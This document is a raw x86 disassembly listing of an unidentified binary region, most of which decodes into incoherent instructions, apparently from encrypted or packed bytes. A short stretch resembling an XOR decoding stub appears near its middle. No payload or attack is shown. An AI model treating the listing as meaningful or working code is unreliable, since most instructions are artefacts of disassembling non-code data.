  411833:	outs   dx,BYTE PTR ds:[esi]
  411834:	pop    esi
  411835:	dec    edx
  411836:	jle    0x411810
  411838:	and    BYTE PTR [esi-0x66],dl
  41183b:	mov    esi,DWORD PTR [ebp+0xc]
  41183e:	sub    eax,edx
  411840:	add    DWORD PTR ds:0x42fcf5,0x7f3f
  41184a:	xor    eax,ecx
  41184c:	mov    DWORD PTR ds:0x42fd7a,0x5771
  411856:	cmp    eax,esi
  411858:	mov    DWORD PTR ds:0x42fd76,0x752
  411862:	jne    0x411c7d
  411868:	jmp    0x411c6d
  41186d:	js     0x411844
  41186f:	stos   BYTE PTR es:[edi],al
  411870:	loopne 0x4118db
  411872:	jae    0x4118b6
  411874:	cmc    
  411875:	pop    esi
  411876:	sub    BYTE PTR [ecx+0x35c65ae9],dl
  41187c:	mov    dh,BYTE PTR [esi+0x57]
  41187f:	jo     0x4118f1
  411881:	pop    eax
  411882:	jge    0x4118f4
  411884:	jo     0x411867
  411886:	in     al,0xa9
  411888:	rcr    BYTE PTR [ecx+0x76],cl
  41188b:	outs   dx,DWORD PTR ds:[esi]
  41188c:	rcr    DWORD PTR [ebx+0x532b7fbe],1
  411892:	adc    edi,DWORD PTR [edx]
  411894:	jl     0x4118e4
  411896:	and    al,0xe2
  411898:	(bad)
  41189b:	mov    ebp,0x3552a470
  4118a0:	cmp    DWORD PTR [esi],edx
  4118a2:	push   esi
  4118a3:	push   0x72
  4118a5:	fs popa 
  4118a7:	rol    esp,1
  4118a9:	ret    0xe24d
  4118ac:	dec    edx
  4118ad:	pop    eax
  4118ae:	mov    eax,ds:0x6b12e88
  4118b3:	test   ah,ch
  4118b5:	fldenv [eax+eiz*4]
  4118b8:	(bad)  
  4118b9:	xor    BYTE PTR [edx],dh
  4118bb:	ret    0xd5f2
  4118be:	inc    esp
  4118bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118c0:	stos   BYTE PTR es:[edi],al
  4118c1:	and    dh,BYTE PTR [esi]
  4118c3:	pop    ss
  4118c4:	rol    BYTE PTR [edx],1
  4118c6:	popf   
  4118c7:	loopne 0x4118e9
  4118c9:	pop    esi
  4118ca:	add    bh,BYTE PTR [edi+0x39]
  4118cd:	int    0x7c
  4118cf:	ins    DWORD PTR es:[edi],dx
  4118d0:	pop    ebp
  4118d1:	repz inc ecx
  4118d3:	jbe    0x41192f
  4118d5:	int    0x40
  4118d7:	mov    WORD PTR [ebx],fs
  4118d9:	mov    ebp,0x434b6a59
  4118de:	test   eax,0x9dd81e35
  4118e3:	pop    edi
  4118e4:	xchg   ebp,eax
  4118e5:	mov    esp,ecx
  4118e7:	outs   dx,DWORD PTR ds:[esi]
  4118e8:	adc    esp,DWORD PTR [ebx+eiz*4]
  4118eb:	outs   dx,BYTE PTR ss:[esi]
  4118ed:	jne    0x41190d
  4118ef:	js     0x4118a1
  4118f1:	ss jmp 0x9e0b0f69
  4118f7:	or     eax,0xc20caf53
  4118fc:	dec    ebx
  4118fd:	xor    ecx,ebx
  4118ff:	dec    ebp
  411900:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411901:	sub    al,BYTE PTR [ebp+0x6]
  411904:	inc    eax
  411905:	mov    edx,0xb0e88754
  41190a:	test   eax,0x34e6335c
  41190f:	outs   dx,DWORD PTR ds:[esi]
  411910:	mov    ebx,0xd65d1007
  411915:	inc    esp
  411916:	mov    dh,0x66
  411918:	mov    al,ds:0xc81547aa
  41191d:	call   0xe044:0xfb0142a5
  411924:	rcl    BYTE PTR [ecx],0x71
  411927:	sub    BYTE PTR [ebp+0x5c],0x9
  41192b:	add    esi,esp
  41192d:	dec    ecx
  41192e:	dec    eax
  41192f:	jecxz  0x4119a2
  411931:	rcr    ah,1
  411933:	xchg   edx,eax
  411934:	outs   dx,BYTE PTR ds:[esi]
  411935:	arpl   WORD PTR [eax+0x57],di
  411938:	loope  0x4118c8
  41193a:	pop    esi
  41193b:	(bad)  
  41193c:	xlat   BYTE PTR ds:[ebx]
  41193d:	arpl   sp,dx
  41193f:	mov    ebp,0x68acf7eb
  411944:	cs (bad) 
  411946:	jge    0x4118d9
  411948:	cdq    
  411949:	xchg   esp,eax
  41194a:	sar    BYTE PTR [edi+eiz*1],1
  41194d:	stos   DWORD PTR es:[edi],eax
  41194e:	test   al,0x46
  411950:	dec    edi
  411951:	adc    BYTE PTR [ebp+0x6c],0x19
  411955:	sub    eax,0x73b891b0
  41195a:	xor    bl,dl
  41195c:	cmp    bh,cl
  41195e:	loopne 0x4119ac
  411960:	sbb    cl,BYTE PTR [ecx+0x5621cad4]
  411966:	or     edi,ebp
  411968:	rcr    DWORD PTR [ecx-0x7859cc63],1
  41196e:	mov    ds:0xce08e6c1,eax
  411973:	xchg   DWORD PTR [eax-0xc],eax
  411976:	jge    0x4119cf
  411978:	(bad)  
  411979:	sub    al,0xbd
  41197b:	rol    dl,0x7d
  41197e:	scas   eax,DWORD PTR es:[edi]
  41197f:	or     DWORD PTR [ecx+ecx*4-0x60],edi
  411983:	adc    eax,0x877f1aff
  411988:	out    0x46,eax
  41198a:	jmp    0xfd49:0xea8568d2
  411991:	push   esi
  411992:	or     eax,0x8b8f99b8
  411997:	pop    edx
  411998:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411999:	shl    eax,0x14
  41199c:	les    eax,FWORD PTR [ebx+0x77cdc8dd]
  4119a2:	retf   0x66ba
  4119a5:	push   0xfffffffd
  4119a7:	fstp   TBYTE PTR ds:0xe3deb7e5
  4119ad:	fcmovb st,st(0)
  4119af:	ss mov ecx,0xc2c29b13
  4119b5:	cli    
  4119b6:	mov    dl,0xdb
  4119b8:	jle    0x4119da
  4119ba:	inc    ebp
  4119bb:	icebp  
  4119bc:	xor    DWORD PTR [ebx+eiz*1+0x764d782c],esp
  4119c3:	enter  0xc8b,0xb8
  4119c7:	ror    ch,0xea
  4119ca:	add    esp,ecx
  4119cc:	push   0x7f9ece59
  4119d1:	mov    ebx,0x5796ff69
  4119d6:	and    DWORD PTR [eax-0x4e1d4392],esp
  4119dc:	jl     0x411966
  4119de:	mov    ebx,0x3dfe1f19
  4119e3:	loope  0x4119a4
  4119e5:	jb     0x411973
  4119e7:	test   DWORD PTR ds:0x636d677f,esi
  4119ed:	inc    edx
  4119ee:	add    al,0x5d
  4119f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119f1:	fild   QWORD PTR [esi+edx*2-0x2f0a77b8]
  4119f8:	pop    esi
  4119f9:	int    0xec
  4119fb:	dec    edi
  4119fc:	jmp    0xdd28df67
  411a01:	(bad)  
  411a02:	out    dx,al
  411a03:	sbb    eax,0xc6f5ab27
  411a08:	in     al,dx
  411a09:	add    al,BYTE PTR [ebx]
  411a0b:	scas   eax,DWORD PTR es:[edi]
  411a0c:	js     0x4119fd
  411a0e:	mov    edx,DWORD PTR [esi+0x5c]
  411a11:	cli    
  411a12:	mov    WORD PTR [edi],es
  411a14:	cmc    
  411a15:	push   ebx
  411a16:	sar    BYTE PTR [edi-0x6c17f516],0xc7
  411a1d:	xor    DWORD PTR [ebp+edi*2+0x4a],ecx
  411a21:	jl     0x411a67
  411a23:	ret    0x4010
  411a26:	jmp    0xd18a:0x6a217b55
  411a2d:	int3   
  411a2e:	arpl   WORD PTR [eax],dx
  411a30:	aas    
  411a31:	mov    edx,?
  411a33:	sub    al,0xed
  411a35:	loope  0x411a4d
  411a37:	jp     0x4119f2
  411a39:	into   
  411a3a:	arpl   si,ax
  411a3c:	mov    bl,0x48
  411a3e:	xchg   esp,eax
  411a3f:	inc    eax
  411a40:	add    eax,DWORD PTR [ebx]
  411a42:	and    eax,0xce52c519
  411a47:	xor    BYTE PTR [ebx+0x6591aedc],ah
  411a4d:	cmp    al,0x6c
  411a4f:	mov    ebx,0x29c4ea32
  411a54:	dec    ecx
  411a55:	dec    ebx
  411a56:	xchg   BYTE PTR [ecx+ebp*8+0x57c18cd3],dl
  411a5d:	sub    dl,BYTE PTR [ecx-0x7229be7e]
  411a63:	test   al,0x96
  411a65:	sti    
  411a66:	xlat   BYTE PTR ds:[ebx]
  411a67:	mov    ecx,0x24f4bf9c
  411a6c:	inc    esp
  411a6d:	push   ss
  411a6e:	sub    WORD PTR [edi-0x45],ax
  411a72:	push   ds
  411a73:	mov    al,ds:0xb4f2bb32
  411a78:	mov    DWORD PTR [edx+0x791d7aa5],ecx
  411a7e:	pop    esp
  411a7f:	push   ds
  411a80:	in     eax,dx
  411a81:	ret    
  411a82:	fistp  QWORD PTR [edx-0x10]
  411a85:	mov    DWORD PTR [ebx+0x4a],0xc379dd91
  411a8c:	icebp  
  411a8d:	jg     0x411aba
  411a8f:	(bad)  
  411a90:	fbstp  TBYTE PTR [esi]
  411a92:	fwait
  411a93:	lods   al,BYTE PTR ds:[esi]
  411a94:	shl    bl,0x42
  411a97:	test   al,0xd1
  411a99:	clc    
  411a9a:	ret    
  411a9b:	and    esp,DWORD PTR [esi-0x41]
  411a9e:	stos   BYTE PTR es:[edi],al
  411a9f:	aad    0x36
  411aa1:	cmp    esi,DWORD PTR [ebp-0x5c97f774]
  411aa7:	and    dh,BYTE PTR [edi+0x7c]
  411aaa:	pop    es
  411aab:	mov    esi,0xde68b3ae
  411ab0:	inc    esp
  411ab1:	js     0x411afc
  411ab3:	imul   esp,DWORD PTR [esi-0x26],0xc88d1830
  411aba:	xor    BYTE PTR [esi+0x1e],dl
  411abd:	cli    
  411abe:	bound  esp,QWORD PTR [ecx+0x5f]
  411ac1:	push   cs
  411ac2:	fwait
  411ac3:	push   edi
  411ac4:	inc    edi
  411ac5:	fcom   DWORD PTR [esi-0x3bdd775e]
  411acb:	mov    ch,0x3f
  411acd:	cmp    BYTE PTR [edx],al
  411acf:	mov    ecx,0xa251b62
  411ad4:	shl    DWORD PTR [ebx],1
  411ad6:	popf   
  411ad7:	pushf  
  411ad8:	sbb    bh,cl
  411ada:	stc    
  411adb:	fild   QWORD PTR [ebp+esi*2-0x4e]
  411adf:	adc    al,0x82
  411ae1:	aas    
  411ae2:	rol    BYTE PTR [ebp-0x1a],cl
  411ae5:	fdiv   st,st(5)
  411ae7:	loop   0x411ae2
  411ae9:	sub    al,0xd3
  411aeb:	test   BYTE PTR [ebx+0xb],bh
  411aee:	ret    0xf4e
  411af1:	mov    BYTE PTR [ebx-0x7d78670e],al
  411af7:	imul   edx,DWORD PTR [ebx-0x19],0xffffff8b
  411afb:	loopne 0x411b79
  411afd:	cdq    
  411afe:	pop    ebp
  411aff:	push   edi
  411b00:	mov    ss,WORD PTR [ecx]
  411b02:	mov    al,ds:0x1a410097
  411b07:	outs   dx,BYTE PTR ds:[esi]
  411b08:	sbb    DWORD PTR [ebx+0x27],eax
  411b0b:	(bad)  
  411b0c:	ds jns 0x411b0c
  411b0f:	and    BYTE PTR ds:0x8d8d83c3,bl
  411b15:	mov    ebp,0xffb6af46
  411b1a:	inc    esi
  411b1b:	push   0xffffff8b
  411b1d:	inc    ebx
  411b1e:	call   0x5249:0x7a3518f5
  411b25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b26:	retf   
  411b27:	retf   
  411b28:	pop    edx
  411b29:	xor    al,0xe6
  411b2b:	retf   0x8baf
  411b2e:	sbb    BYTE PTR ds:0x4239f92c,bl
  411b34:	(bad)  
  411b35:	pop    ecx
  411b36:	and    cl,cl
  411b38:	push   ss
  411b39:	xchg   ebx,eax
  411b3a:	lea    ebp,[ebx-0x2abfbaad]
  411b40:	push   esp
  411b41:	push   cs
  411b42:	cmp    BYTE PTR [esi+eiz*1+0x3f],cl
  411b46:	jp     0x411b34
  411b48:	std    
  411b49:	(bad)  [eax+ebp*2+0x15]
  411b4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b4e:	xor    esp,DWORD PTR [ebp-0x35b8aafb]
  411b54:	mov    eax,ds:0xc766c04a
  411b59:	jecxz  0x411bcb
  411b5b:	aad    0xcf
  411b5d:	in     al,dx
  411b5e:	clc    
  411b5f:	dec    eax
  411b60:	outs   dx,DWORD PTR ds:[esi]
  411b61:	leave  
  411b62:	pop    ecx
  411b63:	mov    ecx,0x91d82775
  411b68:	gs ret 0x77f
  411b6c:	out    dx,al
  411b6d:	lods   eax,DWORD PTR ds:[esi]
  411b6e:	or     eax,0x854725ce
  411b73:	(bad)  
  411b74:	rcr    edx,1
  411b76:	in     eax,dx
  411b77:	fucomp st(1)
  411b79:	or     eax,0x56808d72
  411b7e:	adc    eax,0x5965edf
  411b83:	std    
  411b84:	mov    bl,0xee
  411b86:	mov    DWORD PTR [ecx+0x6d23a6d2],ebp
  411b8c:	mul    DWORD PTR [esi]
  411b8e:	mov    al,ds:0x1dfebb47
  411b93:	mov    esi,edi
  411b95:	nop
  411b96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b97:	lar    esp,di
  411b9a:	(bad)  
  411b9b:	xchg   ebp,eax
  411b9c:	pop    ebx
  411b9d:	push   0xe38af760
  411ba2:	pop    esi
  411ba3:	xchg   ebp,eax
  411ba4:	lods   al,BYTE PTR ds:[esi]
  411ba5:	mov    ds:0xc391cea4,al
  411baa:	xor    edx,0x6fe39769
  411bb0:	mov    eax,ds:0x8bdba147
  411bb5:	(bad)  
  411bb6:	dec    edi
  411bb7:	mov    bh,0x68
  411bb9:	js     0x411b65
  411bbb:	pop    esp
  411bbc:	push   ebx
  411bbd:	mov    ds:0x93510d67,eax
  411bc2:	or     BYTE PTR [ebx-0x7b],0x68
  411bc6:	or     ah,BYTE PTR [edx-0x2246616b]
  411bcc:	pushf  
  411bcd:	lods   al,BYTE PTR ds:[esi]
  411bce:	mov    esi,0xcb2276d
  411bd3:	std    
  411bd4:	pop    ss
  411bd5:	jne    0x411b58
  411bd7:	cdq    
  411bd8:	(bad)  
  411bd9:	dec    edi
  411bda:	jmp    0x411c32
  411bdc:	in     eax,dx
  411bdd:	mov    ecx,0xf807126d
  411be2:	ins    BYTE PTR es:[edi],dx
  411be3:	cwde   
  411be4:	pop    ds
  411be5:	pusha  
  411be6:	out    0x45,eax
  411be8:	aam    0x5f
  411bea:	xor    eax,0x829d9143
  411bef:	jns    0x411bad
  411bf1:	fld    QWORD PTR [eax+0x3d2c270f]
  411bf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bf8:	xchg   esi,eax
  411bf9:	outs   dx,DWORD PTR ds:[esi]
  411bfa:	lea    ebp,[esp+edi*8]
  411bfd:	sti    
  411bfe:	call   0x6481:0x3ae031af
  411c05:	mov    esi,0xfce61d72
  411c0a:	sub    cl,dh
  411c0c:	scas   al,BYTE PTR es:[edi]
  411c0d:	pop    eax
  411c0e:	jmp    0x32bb:0x9d02318d
  411c15:	retf   
  411c16:	dec    DWORD PTR [ebx]
  411c18:	popa   
  411c19:	div    BYTE PTR [edx]
  411c1b:	test   DWORD PTR [edx],ebx
  411c1d:	shl    ah,0x48
  411c20:	sub    bl,dh
  411c22:	inc    edx
  411c23:	in     eax,0xf0
  411c25:	mov    ds:0xa6b4b958,al
  411c2a:	cmp    bl,BYTE PTR [ebp-0x10]
  411c2d:	loopne 0x411c87
  411c2f:	xchg   esp,eax
  411c30:	aam    0x7d
  411c32:	xchg   esi,eax
  411c33:	mov    esp,0x15d5daee
  411c38:	test   DWORD PTR [esi-0x4c],ebp
  411c3b:	(bad)  
  411c3c:	ds retf 0xceea
  411c40:	adc    BYTE PTR [ebx-0x76],al
  411c43:	cli    
  411c44:	push   esp
  411c45:	adc    edi,esp
  411c47:	inc    BYTE PTR [edi]
  411c49:	and    eax,0x23bb1354
  411c4e:	jge    0x411c83
  411c50:	mov    DWORD PTR [edi-0x10],0xc510cd4a
  411c57:	out    0xdc,eax
  411c59:	add    eax,0x894c990a
  411c5e:	aam    0xca
  411c60:	mov    cl,0xea
  411c62:	mov    DWORD PTR [ecx-0x4d],edi
  411c65:	sub    dl,BYTE PTR ss:[ecx-0x725ad9a]
  411c6c:	push   0xffffffa1
  411c6e:	sub    al,0xb2
  411c70:	inc    ecx
  411c71:	add    BYTE PTR [ebx],al
  411c73:	add    eax,0x41b224
  411c78:	jmp    0x411c84
  411c7d:	mov    eax,DWORD PTR [ebp+0xc]
  411c80:	xor    eax,ecx
  411c82:	add    eax,edx
  411c84:	mov    ds:0x41b224,eax
  411c89:	mov    eax,DWORD PTR [ebp+0xc]
  411c8c:	xor    eax,ecx
  411c8e:	add    eax,edx
  411c90:	mov    ds:0x41b22c,eax
  411c95:	jmp    0x4120a9
  411c9a:	mov    eax,ds:0x41b22c
  411c9f:	mov    ds:0x41b224,eax
  411ca4:	jmp    0x4120a9
  411ca9:	mov    dh,0x72
  411cab:	cwde   
  411cac:	test   al,0x64
  411cae:	jb     0x411c66
  411cb0:	jb     0x411ca3
  411cb2:	xchg   ecx,eax
  411cb3:	adc    eax,0x4effd45e
  411cb8:	pop    esi
  411cb9:	pop    esi
  411cba:	push   ebx
  411cbb:	jo     0x411d2d
  411cbd:	pop    eax
  411cbe:	jge    0x411d30
  411cc0:	jo     0x411ccf
  411cc2:	aam    0x12
  411cc4:	sbb    al,0x95
  411cc6:	jg     0x411c71
  411cc8:	mov    ebx,0x1f16f49b
  411ccd:	push   0x198acaca
  411cd2:	enter  0x6c05,0xb9
  411cd6:	dec    ebp
  411cd7:	jecxz  0x411cd2
  411cd9:	sahf   
  411cda:	xchg   ecx,eax
  411cdb:	in     eax,0xaa
  411cdd:	adc    BYTE PTR [esi+ebx*4-0x1876524b],dl
  411ce4:	leave  
  411ce5:	mov    dh,0x27
  411ce7:	les    eax,FWORD PTR [edx+0x4a92d1b1]
  411ced:	inc    esp
  411cee:	mov    db4,ebx
  411cf1:	and    ecx,edi
  411cf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cf4:	ss jns 0x411ca7
  411cf7:	(bad)  
  411cf9:	xchg   ebx,eax
  411cfa:	pop    eax
  411cfb:	aam    0xc7
  411cfd:	daa    
  411cfe:	(bad)  
  411cff:	and    ah,cl
  411d01:	mov    bh,BYTE PTR [esi]
  411d03:	aam    0x6c
  411d05:	adc    BYTE PTR [esi],0xab
  411d08:	retf   0x208d
  411d0b:	jl     0x411cdc
  411d0d:	in     eax,dx
  411d0e:	jne    0x411d49
  411d10:	pop    edx
  411d11:	add    eax,DWORD PTR [ecx-0x39eacdeb]
  411d17:	jp     0x411cc7
  411d19:	jmp    0x411d1f
  411d1b:	retf   0x1a46
  411d1e:	scas   eax,DWORD PTR es:[edi]
  411d1f:	stos   DWORD PTR es:[edi],eax
  411d20:	aad    0x70
  411d22:	add    eax,0xc7daed76
  411d27:	pop    ecx
  411d28:	push   edx
  411d29:	push   0x2b03a306
  411d2e:	and    BYTE PTR [ecx-0x375b130],ch
  411d34:	jp     0x411cda
  411d36:	sub    eax,0x36916537
  411d3b:	mov    eax,ds:0xbde49780
  411d40:	push   edi
  411d41:	mov    al,0x21
  411d43:	out    dx,al
  411d44:	mov    eax,0x3326aeed
  411d49:	or     ah,cl
  411d4b:	verw   WORD PTR [edx-0x7fb66d01]
  411d52:	mov    ecx,0x40f0ba2b
  411d57:	dec    edx
  411d58:	test   al,0x1e
  411d5a:	ja     0x411d93
  411d5c:	inc    edi
  411d5d:	dec    eax
  411d5e:	loop   0x411ddd
  411d60:	jl     0x411d0f
  411d62:	pop    ds
  411d63:	test   BYTE PTR [ebx-0x36],dh
  411d66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d67:	jge    0x411d7f
  411d69:	dec    edx
  411d6a:	push   cs
  411d6b:	adc    eax,0xec9a347f
  411d70:	adc    esp,DWORD PTR [ebx-0x6d]
  411d73:	mov    dh,0x7
  411d75:	out    dx,eax
  411d76:	dec    edi
  411d77:	and    eax,0x5dcff5a9
  411d7c:	lea    ebp,es:[edx+0x4720a11c]
  411d83:	(bad)  
  411d84:	jmp    0x36714f5c
  411d89:	nop
  411d8a:	pop    edx
  411d8b:	out    0xa9,al
  411d8d:	ds mov bl,ch
  411d90:	scas   al,BYTE PTR es:[edi]
  411d91:	push   esi
  411d92:	jae    0x411dde
  411d94:	loopne 0x411d75
  411d96:	sub    DWORD PTR [edx],esi
  411d98:	popf   
  411d99:	aas    
  411d9a:	or     bh,BYTE PTR [edx]
  411d9c:	out    0xfd,al
  411d9e:	cmp    BYTE PTR [esi],0xdd
  411da1:	mov    esp,DWORD PTR [ebx-0x18]
  411da4:	fst    DWORD PTR [ebx]
  411da6:	xor    ebx,eax
  411da8:	or     BYTE PTR [ebx-0x3c],al
  411dab:	iret   
  411dac:	dec    esp
  411dad:	mov    bh,0xd5
  411daf:	mov    edx,es
  411db1:	mov    ds:0x68beda0c,al
  411db6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411db7:	jl     0x411d57
  411db9:	repz retf 0xbbeb
  411dbd:	cdq    
  411dbe:	loope  0x411db8
  411dc0:	add    al,0xaa
  411dc2:	push   ss
  411dc3:	in     eax,0x7
  411dc5:	pop    esp
  411dc6:	sub    al,0x40
  411dc8:	xchg   esp,eax
  411dc9:	shr    ah,0x4b
  411dcc:	aam    0x2b
  411dce:	push   0xad23d225
  411dd3:	fnstcw WORD PTR [edi+0x18]
  411dd6:	jmp    0x4f738772
  411ddb:	fs dec edi
  411ddd:	xchg   edx,eax
  411dde:	stos   DWORD PTR es:[edi],eax
  411ddf:	xchg   edi,eax
  411de0:	cmp    bl,ah
  411de2:	inc    eax
  411de3:	ret    
  411de4:	xor    eax,0xcbf02144
  411de9:	inc    ebx
  411dea:	out    0x1a,al
  411dec:	xlat   BYTE PTR ds:[ebx]
  411ded:	imul   DWORD PTR [ebx+eax*2+0x1893a39c]
  411df4:	and    eax,0xc7faa71d
  411df9:	sti    
  411dfa:	popf   
  411dfb:	(bad)  
  411dfc:	dec    ebp
  411dfd:	xchg   DWORD PTR [esp+edx*4+0x51],esp
  411e01:	addr16 es mov ebx,ebx
  411e05:	aad    0x20
  411e07:	push   0x3
  411e09:	cmp    DWORD PTR [ebp+0x62108676],esi
  411e0f:	(bad)  
  411e10:	xor    BYTE PTR [ecx+0x482abea7],ah
  411e16:	ins    BYTE PTR es:[edi],dx
  411e17:	(bad)  
  411e18:	cmp    al,0x35
  411e1a:	sbb    DWORD PTR [esi-0x246a6e97],ebx
  411e20:	inc    edi
  411e21:	inc    eax
  411e22:	mov    edi,DWORD PTR [edi+0x15a8c22a]
  411e28:	xor    BYTE PTR [esi+0x3e],dl
  411e2b:	sti    
  411e2c:	aaa    
  411e2d:	int    0x52
  411e2f:	push   DWORD PTR [edx+ebx*2-0x4e2b4e44]
  411e36:	les    ebx,FWORD PTR [ecx]
  411e38:	mov    WORD PTR [esi+0x5497a501],cs
  411e3e:	xor    cl,ah
  411e40:	sar    DWORD PTR [edi-0x3f],0x62
  411e44:	dec    ebp
  411e45:	out    dx,al
  411e46:	cmp    cl,BYTE PTR ds:0x317b1cd5
  411e4c:	or     eax,0x9326d4e7
  411e51:	js     0x411e6a
  411e53:	retf   
  411e54:	mov    cl,0xd
  411e56:	mov    ah,BYTE PTR [edi]
  411e58:	ret    
  411e59:	enter  0xd2c,0xaa
  411e5d:	shl    DWORD PTR [ebp+0xf],1
  411e60:	dec    esp
  411e61:	stos   DWORD PTR es:[edi],eax
  411e62:	or     BYTE PTR [esi-0x7077494d],cl
  411e68:	pop    esp
  411e69:	lods   eax,DWORD PTR ds:[esi]
  411e6a:	mov    ch,0x73
  411e6c:	jns    0x411e4e
  411e6e:	leave  
  411e6f:	mov    WORD PTR [eax+0x25],cs
  411e72:	or     cl,0xb4
  411e75:	icebp  
  411e76:	icebp  
  411e77:	stc    
  411e78:	fcom   QWORD PTR [ebp-0x76beaba7]
  411e7e:	or     eax,0x1a772958
  411e83:	cmp    edi,DWORD PTR [eax+eiz*2+0x74]
  411e87:	adc    eax,0x98127724
  411e8c:	inc    edi
  411e8d:	adc    ebx,esi
  411e8f:	inc    esp
  411e90:	mul    DWORD PTR ds:0xf10e54af
  411e96:	data16 fdiv QWORD PTR [edx+eiz*2]
  411e9a:	mov    ds:0x124253ad,al
  411e9f:	call   0xce49:0x36ac2fa2
  411ea6:	mov    eax,0xb357a6f5
  411eab:	pushf  
  411eac:	lods   eax,DWORD PTR ds:[esi]
  411ead:	rcr    DWORD PTR [esi-0xe],0xa4
  411eb1:	push   edi
  411eb2:	sahf   
  411eb3:	icebp  
  411eb4:	push   ss
  411eb5:	jg     0x411e5c
  411eb7:	fdivr  st(4),st
  411eb9:	shl    DWORD PTR [eax],1
  411ebb:	sahf   
  411ebc:	jns    0x411eb9
  411ebe:	mov    edi,0xbd0a2f43
  411ec3:	sbb    eax,0xa74eff6
  411ec8:	and    edi,DWORD PTR ds:0xb865b560
  411ece:	pop    esi
  411ecf:	fld    TBYTE PTR [esi-0x6b7bc1a5]
  411ed5:	es xchg ch,dh
  411ed8:	jl     0x411e8a
  411eda:	out    0x40,eax
  411edc:	cdq    
  411edd:	or     ebx,DWORD PTR [eax+0x6c209385]
  411ee3:	cmp    al,0x11
  411ee5:	ins    DWORD PTR es:[edi],dx
  411ee6:	xchg   edi,eax
  411ee7:	dec    eax
  411ee8:	xchg   ebp,eax
  411ee9:	in     al,0x9a
  411eeb:	retf   
  411eec:	cli    
  411eed:	mov    dl,0xac
  411eef:	mov    ds:0x7ec5b95d,eax
  411ef4:	out    dx,al
  411ef5:	aam    0xa8
  411ef7:	(bad)  
  411ef8:	fnsave [eax+0x7fd0892a]
  411efe:	mov    DWORD PTR [esi+esi*1],edx
  411f01:	mov    cl,0x80
  411f03:	inc    edi
  411f04:	sbb    BYTE PTR [edi+esi*2-0x79674247],0x89
  411f0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f0d:	and    edi,DWORD PTR [ebp+0x58]
  411f10:	pushf  
  411f11:	pop    ecx
  411f12:	fwait
  411f13:	mov    al,ds:0x827ed2ae
  411f18:	jecxz  0x411f99
  411f1a:	mov    edx,0xb1552fba
  411f1f:	(bad)  
  411f20:	sub    ch,BYTE PTR [esi+0x33703abb]
  411f26:	in     eax,dx
  411f27:	out    0x6,al
  411f29:	jb     0x411f88
  411f2b:	xor    al,0x48
  411f2d:	bound  esp,QWORD PTR [edx]
  411f2f:	stos   DWORD PTR es:[edi],eax
  411f30:	dec    edi
  411f31:	out    0xaa,eax
  411f33:	xor    DWORD PTR [esi+0x1e],esi
  411f36:	and    al,bl
  411f38:	addr16 jns 0x411ed5
  411f3b:	pop    ecx
  411f3c:	loope  0x411fae
  411f3e:	push   esp
  411f3f:	or     al,0x7e
  411f41:	fst    st(5)
  411f43:	jb     0x411efd
  411f45:	(bad)  
  411f46:	dec    ebx
  411f47:	dec    ecx
  411f48:	jmp    0x6a2f163a
  411f4d:	fucomip st,st(4)
  411f4f:	or     DWORD PTR [ecx],ebx
  411f51:	adc    DWORD PTR [ebp-0x7d3d3045],ecx
  411f57:	pop    ds
  411f58:	enter  0x96b5,0x45
  411f5c:	mov    esi,0x619f0e33
  411f61:	add    BYTE PTR [ecx+0x27f18def],bh
  411f67:	hlt    
  411f68:	push   ss
  411f69:	test   DWORD PTR [ecx-0x4e02c68e],edi
  411f6f:	xor    ah,BYTE PTR [ecx+esi*2-0x56]
  411f73:	jp     0x411f00
  411f75:	(bad)  
  411f76:	cmp    al,0x68
  411f78:	mov    edi,0xd2062595
  411f7d:	aad    0x66
  411f7f:	ror    ch,cl
  411f81:	dec    ebx
  411f82:	and    DWORD PTR [edi+0x45],0x57
  411f86:	pop    ebp
  411f87:	push   ds
  411f88:	addr16 xor esp,eax
  411f8b:	mov    esp,0xd6188274
  411f90:	mov    edx,0x80a317f7
  411f95:	pop    edx
  411f96:	repnz mov DWORD PTR [ecx-0x72acc5b8],0xf058fdea
  411fa1:	push   edx
  411fa2:	(bad)  
  411fa3:	scas   al,BYTE PTR es:[edi]
  411fa4:	test   edi,0x4c4194fd
  411faa:	or     DWORD PTR [edx+0x2699c38d],esp
  411fb0:	inc    ebx
  411fb1:	mov    edi,0x2889c4b9
  411fb6:	push   ds
  411fb7:	les    edx,FWORD PTR [ebx-0x486bdf8c]
  411fbd:	add    eax,0xc4a31d8b
  411fc2:	cmc    
  411fc3:	xchg   DWORD PTR [edi-0x7bb747fe],edx
  411fc9:	outs   dx,BYTE PTR ds:[esi]
  411fca:	sub    cl,al
  411fcc:	and    esi,DWORD PTR [ebx]
  411fce:	stos   BYTE PTR es:[edi],al
  411fcf:	stos   BYTE PTR es:[edi],al
  411fd0:	xlat   BYTE PTR ds:[ebx]
  411fd1:	(bad)  
  411fd2:	fcmovbe st,st(1)
  411fd4:	retf   0x183e
  411fd7:	mov    dl,0xb3
  411fd9:	shl    BYTE PTR [edi],1
  411fdb:	cli    
  411fdc:	push   cs
  411fdd:	fiadd  DWORD PTR fs:[ebx]
  411fe0:	adc    DWORD PTR [edx+0xe],esi
  411fe3:	data16 push di
  411fe6:	add    DWORD PTR [edx-0x14],ecx
  411fe9:	js     0x41202d
  411feb:	shr    dl,0x68
  411fee:	inc    ebx
  411fef:	sub    DWORD PTR [esi+0xc322a0b],0x3c688116
  411ff9:	sar    DWORD PTR [edi+0x39],1
  411ffc:	dec    ebx
  411ffd:	jmp    0xd6ed:0x2d44c8ef
  412004:	arpl   bx,si
  412006:	shr    BYTE PTR [ebx-0x5b],cl
  412009:	push   ss
  41200a:	loopne 0x411fab
  41200c:	mov    ch,0x4
  41200e:	xor    DWORD PTR [ebp+edi*4-0x56b54336],esi
  412015:	cmp    al,0xee
  412017:	test   BYTE PTR [edx-0x631f8045],0x6e
  41201e:	out    0x83,eax
  412020:	xchg   BYTE PTR [ebx],bl
  412022:	sahf   
